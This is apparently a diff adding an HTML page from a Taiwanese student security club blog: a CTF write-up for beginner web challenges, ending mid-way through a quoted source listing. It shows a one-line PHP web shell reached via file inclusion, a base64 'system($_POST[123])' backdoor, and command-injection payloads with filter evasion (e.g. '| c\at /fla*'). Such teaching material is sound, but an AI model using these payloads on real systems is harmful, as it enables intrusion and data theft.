@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/blog/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/blog/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/blog/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/blog/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"scist-tw.github.io","root":"/blog/","scheme":"Pisces","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜尋...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
+  </script>
+
+  <meta name="description" content="Web_Getting StartedRedirect點進去會有一個網站有個連結按下去說可以看 flag按下去會發現他跳轉一下但什麼事情都沒發生 所以我們用 curl 觀察一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020&#x2F;10&#x2F;24 Web Security 基礎 題解">
+<meta property="og:url" content="https://scist-tw.github.io/2020/10/27/2020%20SCIST%20Web/index.html">
+<meta property="og:site_name" content="SCIST Blog">
+<meta property="og:description" content="Web_Getting StartedRedirect點進去會有一個網站有個連結按下去說可以看 flag按下去會發現他跳轉一下但什麼事情都沒發生 所以我們用 curl 觀察一下">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://i.imgur.com/U2BdeJS.png">
+<meta property="og:image" content="https://i.imgur.com/dDyHf4a.png">
+<meta property="og:image" content="https://i.imgur.com/vBh29PS.png">
+<meta property="og:image" content="https://i.imgur.com/3shM31P.png">
+<meta property="og:image" content="https://i.imgur.com/SdwMhzr.png">
+<meta property="og:image" content="https://i.imgur.com/WIyTOiB.png">
+<meta property="og:image" content="https://i.imgur.com/CwER3YA.png">
+<meta property="og:image" content="https://i.imgur.com/cM5cW7J.png">
+<meta property="og:image" content="https://i.imgur.com/I0j56sT.png">
+<meta property="og:image" content="https://i.imgur.com/Xhbvpkd.png">
+<meta property="og:image" content="https://i.imgur.com/IV5ORba.png">
+<meta property="og:image" content="https://i.imgur.com/o5mwrkA.png">
+<meta property="og:image" content="https://i.imgur.com/ExTGae7.png">
+<meta property="og:image" content="https://i.imgur.com/mTwtK4J.png">
+<meta property="og:image" content="https://i.imgur.com/XyBatCK.png">
+<meta property="og:image" content="https://i.imgur.com/WUn8eu8.png">
+<meta property="og:image" content="https://i.imgur.com/ZsgL9rB.png">
+<meta property="og:image" content="https://i.imgur.com/ykAoKB9.png">
+<meta property="og:image" content="https://i.imgur.com/srTM2sf.png">
+<meta property="og:image" content="https://i.imgur.com/2lHwEiz.png">
+<meta property="og:image" content="https://i.imgur.com/6wwGz9R.png">
+<meta property="og:image" content="https://i.imgur.com/cWMJhsO.png">
+<meta property="og:image" content="https://i.imgur.com/3cNVuog.png">
+<meta property="og:image" content="https://i.imgur.com/JAm3gMc.png">
+<meta property="og:image" content="https://i.imgur.com/ckaYl9E.png">
+<meta property="og:image" content="https://i.imgur.com/zhHImZA.png">
+<meta property="og:image" content="https://i.imgur.com/O0FvSjM.png">
+<meta property="og:image" content="https://i.imgur.com/o8oyMS7.png">
+<meta property="og:image" content="https://i.imgur.com/tfz1uP3.png">
+<meta property="og:image" content="https://i.imgur.com/Ewqnn7O.png">
+<meta property="og:image" content="https://i.imgur.com/4DxqNv4.png">
+<meta property="og:image" content="https://i.imgur.com/PNl0NM3.png">
+<meta property="article:published_time" content="2020-10-27T14:01:59.000Z">
+<meta property="article:modified_time" content="2021-02-24T02:37:53.860Z">
+<meta property="article:author" content="SCIST">
+<meta property="article:tag" content="SCIST, 學習資源整合網站, 演算法, 資安">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/U2BdeJS.png">
+
+
+<link rel="canonical" href="https://scist-tw.github.io/2020/10/27/2020%20SCIST%20Web/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-TW'
+  };
+</script>
+
+  <title>2020/10/24 Web Security 基礎 題解 | SCIST Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><link rel="alternate" href="/blog/atom.xml" title="SCIST Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切換導航欄">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/blog/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">SCIST Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-about">
+
+    <a href="/blog/about" rel="section"><i class="fa fa-address-card fa-fw"></i>關於</a>
+
+  </li>
+        <li class="menu-item menu-item-科普知識">
+
+    <a href="/blog/Scientific-knowledge" rel="section"><i class="fa fa-flask fa-fw"></i>科普知識</a>
+
+  </li>
+        <li class="menu-item menu-item-課程影片">
+
+    <a href="/blog/Course-videos" rel="section"><i class="fa fa-video fa-fw"></i>課程影片</a>
+
+  </li>
+        <li class="menu-item menu-item-演算法">
+
+    <a href="/blog/Algorithm" rel="section"><i class="fa fa-terminal fa-fw"></i>演算法</a>
+
+  </li>
+        <li class="menu-item menu-item-資訊安全">
+
+    <a href="/blog/Information-security" rel="section"><i class="fa fa-shield-alt fa-fw"></i>資訊安全</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜尋
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜尋..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目錄
+        </li>
+        <li class="sidebar-nav-overview">
+          本站概要
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-Getting-Started"><span class="nav-number">1.</span> <span class="nav-text">Web_Getting Started</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Redirect"><span class="nav-number">1.1.</span> <span class="nav-text">Redirect</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Form"><span class="nav-number">1.2.</span> <span class="nav-text">Form</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shell"><span class="nav-number">1.3.</span> <span class="nav-text">Shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#KAIBRO-BUY"><span class="nav-number">2.1.</span> <span class="nav-text">KAIBRO BUY</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level"><span class="nav-number">2.2.</span> <span class="nav-text">Level</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Secret-Login"><span class="nav-number">2.3.</span> <span class="nav-text">Secret Login</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Downloader"><span class="nav-number">2.4.</span> <span class="nav-text">Downloader</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lightning"><span class="nav-number">2.5.</span> <span class="nav-text">lightning</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#webshell"><span class="nav-number">2.6.</span> <span class="nav-text">webshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cat-Digger"><span class="nav-number">2.7.</span> <span class="nav-text">Cat Digger</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-2"><span class="nav-number">3.</span> <span class="nav-text">Level 2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#vtim-cmdi"><span class="nav-number">3.1.</span> <span class="nav-text">vtim_cmdi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Local-File-Inclusion"><span class="nav-number">3.2.</span> <span class="nav-text">Local File Inclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BABY-CMDi"><span class="nav-number">3.3.</span> <span class="nav-text">BABY CMDi</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-3"><span class="nav-number">4.</span> <span class="nav-text">Level 3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MyPHP"><span class="nav-number">4.1.</span> <span class="nav-text">MyPHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#youtube-viewer"><span class="nav-number">4.2.</span> <span class="nav-text">youtube_viewer</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#tags-Web-SCIST"><span class="nav-number">4.2.0.0.0.1.</span> <span class="nav-text">tags: Web SCIST</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="SCIST"
+      src="/blog/images/SCIST_logo.png">
+  <p class="site-author-name" itemprop="name">SCIST</p>
+  <div class="site-description" itemprop="description">這是SCIST的學習資源整合網站，包含資安、演算法、程式語言、科普知識</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/blog/archives">
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分類</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/blog/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">標籤</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/blog/atom.xml" rel="alternate">
+      <i class="fa fa-rss-square"></i>
+      RSS
+    </a>
+  </div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/scist-tw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;scist-tw" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:official@scist.org" title="E-Mail → mailto:official@scist.org" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.facebook.com/scist.org" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;scist.org" rel="noopener" target="_blank"><i class="fab fa-facebook fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.youtube.com/channel/UC5lWl8evP-TYy9cldZs8zwA" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC5lWl8evP-TYy9cldZs8zwA" rel="noopener" target="_blank"><i class="fab fa-youtube fa-fw"></i></a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-TW" class="cc-opacity" rel="noopener" target="_blank"><img src="/blog/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </section>
+        <div class="back-to-top animated">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
+    <link itemprop="mainEntityOfPage" href="https://scist-tw.github.io/2020/10/27/2020%20SCIST%20Web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/blog/images/SCIST_logo.png">
+      <meta itemprop="name" content="SCIST">
+      <meta itemprop="description" content="這是SCIST的學習資源整合網站，包含資安、演算法、程式語言、科普知識">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SCIST Blog">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2020/10/24 Web Security 基礎 題解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">發表於</span>
+
+      <time title="創建時間：2020-10-27 22:01:59" itemprop="dateCreated datePublished" datetime="2020-10-27T22:01:59+08:00">2020-10-27</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新於</span>
+        <time title="修改時間：2021-02-24 10:37:53" itemprop="dateModified" datetime="2021-02-24T10:37:53+08:00">2021-02-24</time>
+      </span>
+
+  
+    <span class="post-meta-item" title="閱讀次數" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">閱讀次數：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="Web-Getting-Started"><a href="#Web-Getting-Started" class="headerlink" title="Web_Getting Started"></a>Web_Getting Started</h1><h2 id="Redirect"><a href="#Redirect" class="headerlink" title="Redirect"></a>Redirect</h2><p>點進去會有一個網站<br>有個連結按下去說可以看 flag<br>按下去會發現他跳轉一下<br>但什麼事情都沒發生</p>
+<p>所以我們用 curl 觀察一下</p>
+<p><img src="https://i.imgur.com/U2BdeJS.png"></p>
+<p>觀察到那個連結是確實會導向 <code>flag.php</code> 的<br>但貌似又會跳轉回來</p>
+<p>所以我們再用 curl 觀察一下</p>
+<p><img src="https://i.imgur.com/dDyHf4a.png"></p>
+<p>發現就會有 flag 了</p>
+<p>會跳轉的原因是 <code>flag.php</code> 設定為會 302 跳轉回到 / 下<br>所以瀏覽器才會看不到內容<br>不過我們可以用 curl 去把 browse <code>flag.php</code> 的 response 抓下來<br>這樣就可以不被跳轉的看到內容了</p>
+<h2 id="Form"><a href="#Form" class="headerlink" title="Form"></a>Form</h2><blockquote>
+<p>解法一 </p>
+</blockquote>
+<p>點進網址後，根據提示輸入 <code>123</code>，發現被擋住了</p>
+<p><img src="https://i.imgur.com/vBh29PS.png"></p>
+<p>透過 Chrome 的開發者工具(<code>右鍵&gt;檢查</code>)，發現送出 <code>123</code> 會被 <code>javascript</code> 擋住</p>
+<p><img src="https://i.imgur.com/3shM31P.png"></p>
+<p>點選 <code>form</code> 元素，在下方的 <code>Event Listeners</code> 可以把 <code>onsubmit</code> 註冊的 <code>return checkForm(this)</code> 移除</p>
+<p><img src="https://i.imgur.com/SdwMhzr.png"></p>
+<p>再次送出就可以得到 flag</p>
+<p><img src="https://i.imgur.com/WIyTOiB.png"></p>
+<blockquote>
+<p>解法二</p>
+</blockquote>
+<p>觀察一下他的 input name 跟 method<br><code>name = pw method = POST</code></p>
+<p>可以用 curl 送出資料且不觸發到 JavaScript</p>
+<p><code>curl -d &quot;pw=123&quot; http://140.110.112.78:10204/</code></p>
+<blockquote>
+<p>解法三</p>
+</blockquote>
+<p>打開 Chrome 的 Develope tool<br>先在 form 上面打 123<br>接著在 Develope tool 輸入 <code>document.querySelector(&#39;form&#39;).submit()</code></p>
+<p><img src="https://i.imgur.com/CwER3YA.png"></p>
+<p>這樣就會直接 submit form 裡面的東西 且不會觸發到 onsubmit 的 Js</p>
+<h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>進入網址後，會有三個連結，先傳個檔案上去試試看</p>
+<p><img src="https://i.imgur.com/cM5cW7J.png"></p>
+<p>點進那個連結，會發現我們的檔案路徑為 <code>/files/&lt;hash&gt;/&lt;hash&gt;.txt</code></p>
+<p><img src="https://i.imgur.com/I0j56sT.png"></p>
+<p>回到最一開始的 ?page 那邊，依照他讀取的方式 可以隨意測試一下讀取其他東西</p>
+<p><img src="https://i.imgur.com/Xhbvpkd.png"></p>
+<p>觀察一下，就會發現這個網站存在 LFI 的漏洞<br>從錯誤頁面的截圖，和上傳一個檔案後所存在的路徑，就可以知道檔案的目錄結構</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">|-- index.php</span><br><span class="line">|-- modes</span><br><span class="line">    |-- home</span><br><span class="line">    |-- about</span><br><span class="line">    &#96;-- files</span><br><span class="line">&#96;-- files</span><br><span class="line">    &#96;-- &#123;hash1&#125;</span><br><span class="line">         &#96;-- &#123;hash2&#125;.txt   </span><br></pre></td></tr></table></figure>
+
+<p>透過 LFI 漏洞和檔案上傳就可以得到 <code>SHELL</code></p>
+<p>簡單的 php shell 程式碼</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`$_GET[<span class="number">1</span>]`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>http://140.110.112.78:10210/?page=../files/&#123;hash1&#125;/&#123;hash2&#125;.txt&amp;1=&#123;command&#125;</code></p>
+<p>透過 <code>ls</code> 指令可以知道 flag 在 <code>flag_xxxxxx.txt</code></p>
+<p><img src="https://i.imgur.com/IV5ORba.png"></p>
+<p>直接訪問 <code>http://140.110.112.78:10210/flag_xxxxxx.txt</code> 即可得到 <code>flag</code></p>
+<p><img src="https://i.imgur.com/o5mwrkA.png"></p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="KAIBRO-BUY"><a href="#KAIBRO-BUY" class="headerlink" title="KAIBRO BUY"></a>KAIBRO BUY</h2><p><code>http://140.110.112.78:2500/</code></p>
+<p>我們現在有 1000 元，但是要買到 flag 需要 99999999 元<br><img src="https://i.imgur.com/ExTGae7.png"></p>
+<p>對數字點右鍵，選擇檢查<br><img src="https://i.imgur.com/mTwtK4J.png"></p>
+<p>雖然數字本身是不能改的，但是發現到數字是直接寫在前端的，所以我們可以從 Develope tool 更改成任意值</p>
+<p><img src="https://i.imgur.com/XyBatCK.png"></p>
+<p>賺ww<br><img src="https://i.imgur.com/WUn8eu8.png"></p>
+<h2 id="Level"><a href="#Level" class="headerlink" title="Level"></a>Level</h2><p>題目是要我們達到 level 1000<br>並且我們發現到當點擊 <code>Click me to next level</code> 可以讓 level 加上 1<br><img src="https://i.imgur.com/ZsgL9rB.png"></p>
+<p>當然，你可以很認真地點完這 1000 次<br>不過實際上我們開啟開發者工具檢查一下，會發現到 level 是記錄在 cookie 裡面<br><img src="https://i.imgur.com/ykAoKB9.png"></p>
+<p>所以我們可以直接修改 cookie 的值，接下來重新整理一下頁面就可以拿到 flag 囉!<br><img src="https://i.imgur.com/srTM2sf.png"></p>
+<h2 id="Secret-Login"><a href="#Secret-Login" class="headerlink" title="Secret Login"></a>Secret Login</h2><p>一進來就送我們 source code ，當然要來看一下囉<br><img src="https://i.imgur.com/2lHwEiz.png"></p>
+<p>發現到他會 <code>GET</code> 一個 <code>pass</code> 參數，並拿去跟 config.php 內的 <code>secret</code> 比較</p>
+<p>這邊要用到 php 的小知識: 任何東西和 <code>null</code> 做比較，都會是 <code>true</code></p>
+<p>這邊我們將 pass 以 <code>pass[]</code> 傳過去，這時候的 <code>pass</code> 是一個未定義的陣列，所以會是 <code>null</code></p>
+<p>連結如下: <code>http://140.110.112.78:2502/?pass[]</code></p>
+<p>接下來就拿到 flag 囉!<br><img src="https://i.imgur.com/6wwGz9R.png"></p>
+<p>或是使用 curl</p>
+<p><code> curl -b &quot;level=1000&quot; http://140.110.112.78:25501</code></p>
+<h2 id="Downloader"><a href="#Downloader" class="headerlink" title="Downloader"></a>Downloader</h2><p>進到頁面上可以看到有三個連結，分別會下載到三種不同的怪貓貓<br>檢查原始碼後發現，他會連到 <code>download.php</code> ，並用任意 <code>GET</code> 檔案<br><img src="https://i.imgur.com/cWMJhsO.png"></p>
+<p>這裡就是漏洞所在，現在我們可以透過 <code>download.php</code> 任意下載伺服器上的檔案<br>因為到處猜 flag 猜不到，所以我們就先下載預設就會存在的 <code>index.php</code><br>發現到他 include 了 <code>config.inc.php</code></p>
+<p><img src="https://i.imgur.com/3cNVuog.png"></p>
+<p>那麼就來下載看看吧</p>
+<p><img src="https://i.imgur.com/JAm3gMc.png"></p>
+<h2 id="lightning"><a href="#lightning" class="headerlink" title="lightning"></a>lightning</h2><p>這一題其實在瀏覽過程當中經過了 302 redirect ，所以造成你看不到 flag<br>我們可以藉由 curl 不會被 redirect 的特性來解決</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://140.110.112.78:2507/</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/ckaYl9E.png"></p>
+<p>發現到他會把我們先導向到 <code>flag.php</code></p>
+<p>接著 curl flag.php 就可以拿到 flag 了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://140.110.112.78:2507/flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>一進來就看到 source code<br>發現到他會將一串 base64 的編碼 decode 後執行<br><img src="https://i.imgur.com/zhHImZA.png"></p>
+<p>先來看看這串 base64 的內容吧</p>
+<blockquote>
+<p>system($_POST[123]);</p>
+</blockquote>
+<p>意思是他會接收名稱為 <code>123</code> 的 <code>POST</code> ，並且送到 <code>system</code> 執行<br>所以說… 我們可以透過 POST 讓他執行任意指令了!<br>先用 find 來找找 <code>flag</code> 的位置吧!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d <span class="string">&quot;123=find / -name &quot;</span>flag<span class="string">&quot;&quot;</span> http://140.110.112.78:2508/</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/O0FvSjM.png"></p>
+<p>找到位置後，直接 cat 出來就可以拿到 flag 了</p>
+<h2 id="Cat-Digger"><a href="#Cat-Digger" class="headerlink" title="Cat Digger"></a>Cat Digger</h2><p>這題是 command injection<br>可以發現他會將我們輸入的內容送去執行 dig ，並且將結果輸出到網頁上</p>
+<p>但是因為沒有針對我們的輸入做任何 filter ，我們可以直接截斷 dig 的指令，而去執行我們指定的內容</p>
+<p>例如 輸入 <code>| ls</code> ，就會如實執行</p>
+<blockquote>
+<p>bootstrap.css<br>index.php</p>
+</blockquote>
+<p>所以，跟上一題相同，我們可以先用 find 找到 flag 的位置，最後 cat 出來即可<br>不過這題會檔輸入 <code>flag</code> <code>cat</code> ，所以需要一點跳脫</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| find / -name <span class="string">&quot;fla*&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| c\at /fla*</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`head /fl\ag` ` 內可以直接執行指令</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; c\at /fla* 分號可以接更多指令</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; head /fl* 前者進行完直接接後者</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; c\at /fl* 前者丟入背景執行 後者繼續執行</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果想看更多跳脫方式，可以參考 @MuMu 在 <code>Baby CMDi</code> 的題解</p>
+</blockquote>
+<h1 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h1><h2 id="vtim-cmdi"><a href="#vtim-cmdi" class="headerlink" title="vtim_cmdi"></a>vtim_cmdi</h2><p><code>http://140.110.112.32:31339/index.php</code></p>
+<p>也是command injection。<code>;</code>似乎會被擋掉，但可以用<code>||</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|| ls .</span><br><span class="line"></span><br><span class="line">Here&#39;s your header :</span><br><span class="line">index.nginx-debian.html</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure>
+
+<p>翻找一下就可以看到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|| cat &#x2F;flag&#x2F;Flag&#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>source code</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;HTTP Header Reader v0.008&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;index.php&quot; 